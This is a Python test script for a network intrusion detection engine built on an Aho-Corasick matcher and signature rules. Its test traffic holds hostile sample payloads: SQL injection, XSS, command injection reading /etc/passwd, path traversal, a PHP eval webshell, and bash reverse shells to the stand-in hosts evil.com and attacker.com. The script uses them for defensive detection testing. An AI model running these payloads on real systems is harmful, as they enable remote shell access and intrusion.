"""
模块2 自测脚本 —— 验证特征匹配检测引擎（Aho-Corasick + SignatureEngine）。

运行: python tests/test_module2.py
"""

import sys
import os
import json
import time
import tempfile

sys.path.insert(0, ".")

from module2_signature.matcher import AhoCorasickMatcher
from module2_signature.signature_engine import SignatureEngine
from module2_signature import connect, disconnect
from common import (
    TrafficRecord, IPEndpoint, Alert, SignatureRule,
    ProtocolType, AlertSeverity, AlertType, AlertStatus,
    message_bus,
)

errors = []
total = 0
passed = 0


def check(name, actual, expected):
    global total, passed
    total += 1
    if actual == expected:
        passed += 1
        print(f"  [PASS] {name}")
    else:
        errors.append(f"  [FAIL] {name}: got={actual!r}, expected={expected!r}")
        print(f"  [FAIL] {name}: got={actual!r}, expected={expected!r}")


def check_true(name, condition):
    global total, passed
    total += 1
    if condition:
        passed += 1
        print(f"  [PASS] {name}")
    else:
        errors.append(f"  [FAIL] {name}: condition is False")
        print(f"  [FAIL] {name}: condition is False")


def make_http_record(
    uri="/index.php",
    body="",
    src_ip="192.168.1.100",
    dst_ip="10.0.0.1",
    src_port=50000,
    dst_port=80,
    payload="",
    user_agent="Mozilla/5.0",
    referer="",
    headers=None,
):
    """构造 HTTP 流量记录，模拟模块1产出。"""
    r = TrafficRecord()
    r.src = IPEndpoint(ip=src_ip, port=src_port)
    r.dst = IPEndpoint(ip=dst_ip, port=dst_port)
    r.protocol = ProtocolType.TCP  # HTTP 基于 TCP，规则协议字段均为 TCP
    r.http_method = "GET" if "?" in uri or not body else "POST"
    r.http_uri = uri
    r.http_host = dst_ip
    r.http_body = body
    r.http_user_agent = user_agent
    r.http_referer = referer
    if headers:
        r.http_headers = headers
    # 把 URI + body 也放进 payload（模拟真实抓包）
    if payload:
        r.payload = payload
    else:
        parts = [uri]
        if body:
            parts.append(body)
        if referer:
            parts.append(referer)
        if user_agent:
            parts.append(user_agent)
        if headers:
            for k, v in headers.items():
                parts.append(f"{k}: {v}")
        r.payload = "\n".join(parts)
    r.payload_size = len(r.payload)
    return r


def make_tcp_record(
    src_ip="192.168.1.100",
    dst_ip="10.0.0.1",
    src_port=50000,
    dst_port=22,
    payload="",
    flags=0,
):
    """构造通用 TCP 流量记录。"""
    r = TrafficRecord()
    r.src = IPEndpoint(ip=src_ip, port=src_port)
    r.dst = IPEndpoint(ip=dst_ip, port=dst_port)
    r.protocol = ProtocolType.TCP
    r.payload = payload
    r.payload_size = len(payload)
    r.flags = flags
    return r


# ============================================================
# Part A: AhoCorasickMatcher 单元测试
# ============================================================
print("=" * 60)
print("Part A: AhoCorasickMatcher 单元测试")
print("=" * 60)

# --- A1: 基本单模式匹配 ---
print("\n测试 A1: 基本单模式匹配")
matcher = AhoCorasickMatcher()
matcher.add_pattern("hello", "GREET-001")
matcher.build()
results = matcher.search("hello world")
check("single_match_count", len(results), 1)
if results:
    check("single_match_rule", results[0][0], "GREET-001")
    check("single_match_pattern", results[0][1], "hello")

# --- A2: 多模式匹配 ---
print("\n测试 A2: 多模式匹配")
matcher2 = AhoCorasickMatcher()
matcher2.add_pattern("SQL", "SQL-001")
matcher2.add_pattern("XSS", "XSS-001")
matcher2.add_pattern("CMD", "CMD-001")
matcher2.build()
results2 = matcher2.search("GET /page?q=SQL&x=XSS&c=CMD HTTP/1.1")
check("multi_match_count", len(results2), 3)
found_ids = {r[0] for r in results2}
check("multi_has_SQL", "SQL-001" in found_ids, True)
check("multi_has_XSS", "XSS-001" in found_ids, True)
check("multi_has_CMD", "CMD-001" in found_ids, True)

# --- A3: 大小写不敏感匹配 ---
print("\n测试 A3: 大小写不敏感匹配")
matcher3 = AhoCorasickMatcher(case_sensitive=False)
matcher3.add_pattern("SELECT", "SQL-SELECT")
matcher3.build()
results3 = matcher3.search("select * from users")
check("case_insensitive", len(results3), 1)
if results3:
    check("case_rule_id", results3[0][0], "SQL-SELECT")

# --- A4: URL 解码归一化（抗绕过）---
print("\n测试 A4: URL 解码归一化")
matcher4 = AhoCorasickMatcher(url_decode=True)
matcher4.add_pattern("' OR 1=1", "SQL-001")
matcher4.build()
# URL 编码的 payload
results4 = matcher4.search("GET /?id=1%27%20OR%201%3D1 HTTP/1.1")
check("url_decode_match", len(results4), 1)
if results4:
    check("url_decode_rule", results4[0][0], "SQL-001")

# --- A5: 双层 URL 编码绕过 ---
print("\n测试 A5: 双层 URL 编码绕过")
matcher5 = AhoCorasickMatcher(url_decode=True)
matcher5.add_pattern("<script>", "XSS-001")
matcher5.build()
# %253C = % → %3C (双层编码 <)
results5 = matcher5.search("%253Cscript%253E")
# 双层解码后应匹配 <script>
check("double_encode_match", len(results5) >= 1, True)

# --- A6: 空模式/空文本 ---
print("\n测试 A6: 空模式/空文本边界")
matcher6 = AhoCorasickMatcher()
matcher6.add_pattern("", "EMPTY-RULE")  # 空模式应被忽略
matcher6.build()
check("empty_pattern_count", matcher6.pattern_count, 0)
results6 = matcher6.search("")
check("empty_text", len(results6), 0)

# --- A7: search_first ---
print("\n测试 A7: search_first 方法")
matcher7 = AhoCorasickMatcher()
matcher7.add_pattern("abc", "R1")
matcher7.add_pattern("bcd", "R2")
matcher7.build()
first = matcher7.search_first("abcdef")
check("search_first_not_none", first is not None, True)
if first:
    # "abc" 在位置 0，"bcd" 在位置 1，"abc" 应排前面
    check("search_first_rule", first[0], "R1")

# --- A8: clear 清空 ---
print("\n测试 A8: clear 清空匹配器")
matcher8 = AhoCorasickMatcher()
matcher8.add_pattern("test", "T1")
matcher8.build()
check("before_clear_count", matcher8.pattern_count, 1)
matcher8.clear()
check("after_clear_count", matcher8.pattern_count, 0)
results8 = matcher8.search("test")
check("after_clear_search", len(results8), 0)

# --- A9: 中文字符匹配 ---
print("\n测试 A9: 中文字符匹配")
matcher9 = AhoCorasickMatcher()
matcher9.add_pattern("攻击", "ATTACK-CN")
matcher9.build()
results9 = matcher9.search("这是一次攻击尝试")
check("chinese_match", len(results9), 1)

# --- A10: 重叠模式匹配 ---
print("\n测试 A10: 重叠模式匹配")
matcher10 = AhoCorasickMatcher()
matcher10.add_pattern("abc", "R-ABC")
matcher10.add_pattern("bc", "R-BC")
matcher10.build()
results10 = matcher10.search("abc")
check("overlap_count", len(results10), 2)
found10 = {r[0] for r in results10}
check("overlap_has_abc", "R-ABC" in found10, True)
check("overlap_has_bc", "R-BC" in found10, True)

# --- A11: 无匹配情况 ---
print("\n测试 A11: 无匹配情况")
matcher11 = AhoCorasickMatcher()
matcher11.add_pattern("evil", "EVIL-001")
matcher11.build()
results11 = matcher11.search("clean traffic here")
check("no_match", len(results11), 0)

# --- A12: 重复添加相同 pattern ---
print("\n测试 A12: 重复添加相同 pattern")
matcher12 = AhoCorasickMatcher()
matcher12.add_pattern("dup", "DUP-001")
matcher12.add_pattern("dup", "DUP-002")  # 相同模式不同 rule_id
matcher12.build()
check("dup_pattern_count", matcher12.pattern_count, 2)
results12 = matcher12.search("dup")
check("dup_match_count", len(results12), 2)

# --- A13: 特殊字符匹配 ---
print("\n测试 A13: 特殊字符匹配")
matcher13 = AhoCorasickMatcher()
matcher13.add_pattern("|", "PIPE")
matcher13.add_pattern(";", "SEMICOLON")
matcher13.build()
results13 = matcher13.search("ls | cat; rm")
check("special_char_count", len(results13) >= 2, True)

print()

# ============================================================
# Part B: SignatureEngine 集成测试
# ============================================================
print("=" * 60)
print("Part B: SignatureEngine 集成测试")
print("=" * 60)

# --- B1: 引擎初始化 ---
print("\n测试 B1: 引擎初始化")
engine = SignatureEngine()
check("init_rules", engine.get_rule_count(), 0)
stats = engine.get_statistics()
check("init_total_alerts", stats["total_alerts"], 0)
check("init_traffic_processed", stats["traffic_processed"], 0)
check("init_rules_loaded", stats["rules_loaded"], 0)

# --- B2: load_rules 从 JSON 文件加载 ---
print("\n测试 B2: load_rules 加载特征库")
rules_file = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                          "data", "signatures.json")
count = engine.load_rules(rules_file)
check_true("load_rules_count", count > 0)
check("rules_loaded_stat", engine.get_rule_count(), count)
print(f"  (已加载 {count} 条规则)")

# --- B3: 加载不存在的文件 ---
print("\n测试 B3: 加载不存在的文件")
count3 = engine.load_rules("nonexistent_file.json")
check("nonexistent_file", count3, 0)

# --- B4: SQL 注入检测 ---
print("\n测试 B4: SQL 注入检测")
engine4 = SignatureEngine()
engine4.load_rules(rules_file)
rec_sql = make_http_record(uri="/login.php?user=admin' OR 1=1 --")
alerts_sql = engine4.process_traffic(rec_sql)
sql_alerts = [a for a in alerts_sql if a.attack_type == "sql_injection"]
check_true("sql_detected", len(sql_alerts) >= 1)
if sql_alerts:
    check_true("sql_has_title", len(sql_alerts[0].title) > 0)
    check_true("sql_has_desc", len(sql_alerts[0].description) > 0)
    check_true("sql_severity_high", sql_alerts[0].severity.value >= 3)

# --- B5: XSS 检测 ---
print("\n测试 B5: XSS 检测")
engine5 = SignatureEngine()
engine5.load_rules(rules_file)
rec_xss = make_http_record(
    uri="/comment",
    body="<script>alert('xss')</script>",
)
alerts_xss = engine5.process_traffic(rec_xss)
xss_alerts = [a for a in alerts_xss if a.attack_type == "xss"]
check_true("xss_detected", len(xss_alerts) >= 1)

# --- B6: 命令注入检测 ---
print("\n测试 B6: 命令注入检测")
engine6 = SignatureEngine()
engine6.load_rules(rules_file)
rec_cmd = make_http_record(uri="/ping?host=127.0.0.1; cat /etc/passwd")
alerts_cmd = engine6.process_traffic(rec_cmd)
cmd_alerts = [a for a in alerts_cmd if a.attack_type in ("command_injection", "path_traversal")]
check_true("cmd_detected", len(cmd_alerts) >= 1)

# --- B7: 路径遍历检测 ---
print("\n测试 B7: 路径遍历检测")
engine7 = SignatureEngine()
engine7.load_rules(rules_file)
rec_path = make_http_record(uri="/download?file=../../etc/passwd")
alerts_path = engine7.process_traffic(rec_path)
path_alerts = [a for a in alerts_path if a.attack_type in ("path_traversal", "lfi")]
check_true("path_traversal_detected", len(path_alerts) >= 1)

# --- B8: WebShell 检测 ---
print("\n测试 B8: WebShell 检测")
engine8 = SignatureEngine()
engine8.load_rules(rules_file)
rec_ws = make_http_record(uri="/shell.php", body="<?php eval($_POST['cmd']); ?>")
alerts_ws = engine8.process_traffic(rec_ws)
ws_alerts = [a for a in alerts_ws if a.attack_type == "webshell"]
check_true("webshell_detected", len(ws_alerts) >= 1)

# --- B9: 反弹 Shell 检测 ---
print("\n测试 B9: 反弹 Shell 检测")
engine9 = SignatureEngine()
engine9.load_rules(rules_file)
rec_rev = make_http_record(
    uri="/exec",
    body="bash -i >& /dev/tcp/evil.com/4444 0>&1",
)
alerts_rev = engine9.process_traffic(rec_rev)
rev_alerts = [a for a in alerts_rev if a.attack_type == "reverse_shell"]
check_true("reverse_shell_detected", len(rev_alerts) >= 1)

# --- B10: 非攻击流量不误报 ---
print("\n测试 B10: 非攻击流量不误报")
engine10 = SignatureEngine()
engine10.load_rules(rules_file)
rec_normal = make_http_record(
    uri="/index.html",
    body="<html><body><h1>Welcome</h1><p>正常页面内容</p></body></html>",
    user_agent="Mozilla/5.0 (Windows NT 10.0)",
    referer="https://www.google.com/",
)
alerts_normal = engine10.process_traffic(rec_normal)
check("no_false_positive", len(alerts_normal), 0)

# --- B11: 分类开关 ---
print("\n测试 B11: 分类开关 —— 禁用 SQL 注入检测")
engine11 = SignatureEngine()
engine11.load_rules(rules_file)
engine11.enable_category("sql_injection", False)
rec_sql2 = make_http_record(uri="/login?user=admin' OR 1=1 --")
alerts_disabled = engine11.process_traffic(rec_sql2)
sql_disabled = [a for a in alerts_disabled if a.attack_type == "sql_injection"]
check("category_disabled", len(sql_disabled), 0)
# 重新启用
engine11.enable_category("sql_injection", True)
alerts_enabled = engine11.process_traffic(rec_sql2)
sql_enabled = [a for a in alerts_enabled if a.attack_type == "sql_injection"]
check_true("category_reenabled", len(sql_enabled) >= 1)

# --- B12: 协议过滤 ---
print("\n测试 B12: 协议过滤")
engine12 = SignatureEngine()
engine12.load_rules(rules_file)
# DNS-001 只匹配 UDP 协议
rec_dns = make_tcp_record(
    dst_port=53,
    payload="dns query to evil.nip.io",
)
alerts_dns = engine12.process_traffic(rec_dns)
dns_alerts = [a for a in alerts_dns if a.attack_type == "dns_tunnel"]
check("protocol_filter", len(dns_alerts), 0)  # TCP 不应触发 UDP 规则

# --- B13: 端口过滤 ---
print("\n测试 B13: 端口过滤")
engine13 = SignatureEngine()
engine13.load_rules(rules_file)
# DNS-001 只匹配 dst_port=53
rec_not_dns = make_http_record(
    dst_port=8080,
    uri="/api?domain=evil.nip.io",
)
alerts_not_dns = engine13.process_traffic(rec_not_dns)
dns_not = [a for a in alerts_not_dns if a.attack_type == "dns_tunnel"]
check("port_filter", len(dns_not), 0)

# --- B14: 告警去重 ---
print("\n测试 B14: 告警去重")
engine14 = SignatureEngine()
engine14.load_rules(rules_file)
rec_dup = make_http_record(uri="/api?q=1' OR 1=1 --")
# 第一次应产生告警
alerts1 = engine14.process_traffic(rec_dup)
check("dedup_first", len(alerts1) >= 1, True)
# 第二次同源同目的同类型应被去重
alerts2 = engine14.process_traffic(rec_dup)
sql_dedup = [a for a in alerts2 if a.attack_type == "sql_injection"]
check("dedup_second", len(sql_dedup), 0)

# --- B15: 暴力破解检测 ---
print("\n测试 B15: 暴力破解检测")
engine15 = SignatureEngine()
engine15.load_rules(rules_file)
# 手动降低阈值以加速测试
engine15._brute_force_threshold = 3
engine15._brute_force_window = 60
rec_bf = make_http_record(
    uri="/login",
    body="Login failed for user admin",
    payload="POST /login HTTP/1.1\nLogin failed for user admin",
)
# 发送 5 次登录失败
bf_alerts = []
for i in range(5):
    result = engine15.process_traffic(rec_bf)
    bf_alerts.extend(result)
brute_alerts = [a for a in bf_alerts if a.attack_type == "brute_force"]
check_true("brute_force_detected", len(brute_alerts) >= 1)
if brute_alerts:
    check("brute_src", brute_alerts[0].src_ip, "192.168.1.100")

# --- B16: add_custom_rule ---
print("\n测试 B16: add_custom_rule 动态添加规则")
engine16 = SignatureEngine()
engine16.load_rules(rules_file)
orig_count = engine16.get_rule_count()
ok = engine16.add_custom_rule({
    "rule_id": "CUSTOM-TEST-001",
    "attack_name": "自定义测试规则",
    "attack_type": "command_injection",
    "pattern": "CUSTOM_MALICIOUS_STRING_12345",
    "severity": 5,
    "description": "动态添加的自定义检测规则",
    "protocol": "ANY",
    "dst_port": 0,
})
check("add_custom_ok", ok, True)
check("add_custom_count", engine16.get_rule_count(), orig_count + 1)
# 验证新规则生效
rec_custom = make_http_record(uri="/exec?cmd=CUSTOM_MALICIOUS_STRING_12345")
alerts_custom = engine16.process_traffic(rec_custom)
custom = [a for a in alerts_custom if a.attack_type == "command_injection"]
check_true("custom_rule_works", len(custom) >= 1)

# 添加重复 rule_id 应失败
ok2 = engine16.add_custom_rule({
    "rule_id": "CUSTOM-TEST-001",
    "attack_name": "重复规则",
    "attack_type": "xss",
    "pattern": "duplicate",
    "severity": 3,
    "description": "不应被添加",
    "protocol": "ANY",
    "dst_port": 0,
})
check("add_duplicate_fails", ok2, False)

# --- B17: remove_rule ---
print("\n测试 B17: remove_rule 移除规则")
engine17 = SignatureEngine()
engine17.load_rules(rules_file)
# 先添加一条自定义规则以便测试移除功能
engine17.add_custom_rule({
    "rule_id": "CUSTOM-REMOVE-TEST",
    "attack_name": "待移除规则",
    "attack_type": "command_injection",
    "pattern": "REMOVE_ME_PATTERN",
    "severity": 3,
    "description": "将被移除的规则",
    "protocol": "ANY",
    "dst_port": 0,
})
count_before = engine17.get_rule_count()
# 移除存在的规则
removed = engine17.remove_rule("CUSTOM-REMOVE-TEST")
check("remove_existing", removed, True)
check("remove_count", engine17.get_rule_count(), count_before - 1)
# 移除不存在的规则
removed2 = engine17.remove_rule("NONEXISTENT-999")
check("remove_nonexistent", removed2, False)

# --- B18: get_statistics 统计信息 ---
print("\n测试 B18: get_statistics 统计信息")
stats18 = engine17.get_statistics()
check_true("stats_has_total", "total_alerts" in stats18)
check_true("stats_has_by_type", "alerts_by_type" in stats18)
check_true("stats_has_rules", "rules_loaded" in stats18)
check_true("stats_has_traffic", "traffic_processed" in stats18)
check_true("stats_has_categories", "categories_enabled" in stats18)

# --- B19: 回调机制 ---
print("\n测试 B19: 回调机制")
engine19 = SignatureEngine()
engine19.load_rules(rules_file)
cb_alerts = []
engine19.set_on_alert_callback(lambda a: cb_alerts.append(a))
rec_cb = make_http_record(uri="/hack?id=1' OR 1=1 --")
engine19.process_traffic(rec_cb)
check_true("callback_triggered", len(cb_alerts) >= 1)

# --- B20: 空载荷不报错 ---
print("\n测试 B20: 空载荷流量")
engine20 = SignatureEngine()
engine20.load_rules(rules_file)
rec_empty = make_tcp_record(payload="")
alerts_empty = engine20.process_traffic(rec_empty)
check("empty_payload", len(alerts_empty), 0)

# --- B21: cleanup_expired 清理过期数据 ---
print("\n测试 B21: cleanup_expired 清理过期数据")
engine21 = SignatureEngine()
engine21.load_rules(rules_file)
engine21._brute_force_threshold = 2
engine21._brute_force_window = 1  # 1 秒窗口，很快过期
rec_bf2 = make_tcp_record(
    dst_port=22,
    payload="Login failed",
)
for _ in range(3):
    engine21.process_traffic(rec_bf2)
check_true("bf_data_exists", len(engine21._login_failures) > 0)
# 等待过期
time.sleep(1.1)
engine21.cleanup_expired()
check("bf_data_expired", len(engine21._login_failures), 0)

# --- B22: TrafficRecord 和 TCP 协议匹配 ---
print("\n测试 B22: TCP 协议匹配（非 HTTP 流量）")
engine22 = SignatureEngine()
engine22.load_rules(rules_file)
rec_tcp = make_tcp_record(
    dst_port=4444,
    payload="bash -i >& /dev/tcp/attacker.com/4444",
)
alerts_tcp = engine22.process_traffic(rec_tcp)
rev_tcp = [a for a in alerts_tcp if a.attack_type == "reverse_shell"]
check_true("tcp_reverse_shell", len(rev_tcp) >= 1)

# --- B23: 多个攻击特征同时命中 ---
print("\n测试 B23: 多个攻击特征同时命中（同一条 payload）")
engine23 = SignatureEngine()
engine23.load_rules(rules_file)
rec_multi = make_http_record(
    uri="/vuln.php?file=../../etc/passwd",
    body="<?php system('cat /etc/passwd'); ?>",
)
alerts_multi = engine23.process_traffic(rec_multi)
attack_types_found = {a.attack_type for a in alerts_multi}
print(f"  检测到的攻击类型: {attack_types_found}")
check_true("multi_attack_detected", len(alerts_multi) >= 2)

# --- B24: ISignatureEngine 接口实现验证 ---
print("\n测试 B24: ISignatureEngine 接口实现验证")
from common.engine import ISignatureEngine
check_true("implements_interface", isinstance(engine23, ISignatureEngine))
# 验证所有抽象方法都可调用
check_true("has_load_rules", hasattr(engine23, "load_rules"))
check_true("has_process_traffic", hasattr(engine23, "process_traffic"))
check_true("has_set_callback", hasattr(engine23, "set_on_alert_callback"))
check_true("has_get_rule_count", hasattr(engine23, "get_rule_count"))
check_true("has_add_custom_rule", hasattr(engine23, "add_custom_rule"))
check_true("has_remove_rule", hasattr(engine23, "remove_rule"))
check_true("has_enable_category", hasattr(engine23, "enable_category"))
check_true("has_get_statistics", hasattr(engine23, "get_statistics"))

# --- B25: Alert 结构完整性 ---
print("\n测试 B25: Alert 结构完整性")
engine25 = SignatureEngine()
engine25.load_rules(rules_file)
rec25 = make_http_record(uri="/api?user=admin' OR 1=1 --")
alerts25 = engine25.process_traffic(rec25)
check_true("alert_generated", len(alerts25) >= 1)
if alerts25:
    a = alerts25[0]
    check_true("alert_has_id", len(a.alert_id) > 0)
    check_true("alert_has_timestamp", a.timestamp > 0)
    check("alert_source_type", a.alert_source, AlertType.SIGNATURE)
    check_true("alert_has_rule_id", len(a.rule_id) > 0)
    check_true("alert_has_src_ip", len(a.src_ip) > 0)
    check_true("alert_has_dst_ip", len(a.dst_ip) > 0)
    check_true("alert_has_title", len(a.title) > 0)
    check_true("alert_has_snippet", isinstance(a.payload_snippet, str))
    check_true("alert_has_suggestion", len(a.suggestion) > 0)
    check_true("alert_has_flow_id", isinstance(a.flow_id, str))
    check_true("alert_has_tags", "signature" in a.tags or len(a.tags) > 0)

print()

# ============================================================
# 结果汇总
# ============================================================
print("=" * 60)
print(f"结果: {passed}/{total} 通过", end="")
if errors:
    print(f"  ({len(errors)} 失败)")
    print("\n失败详情:")
    for e in errors:
        print(f"  {e}")
else:
    print("  全部通过!")
print("=" * 60)

# 返回退出码（CI 友好）
sys.exit(0 if not errors else 1)
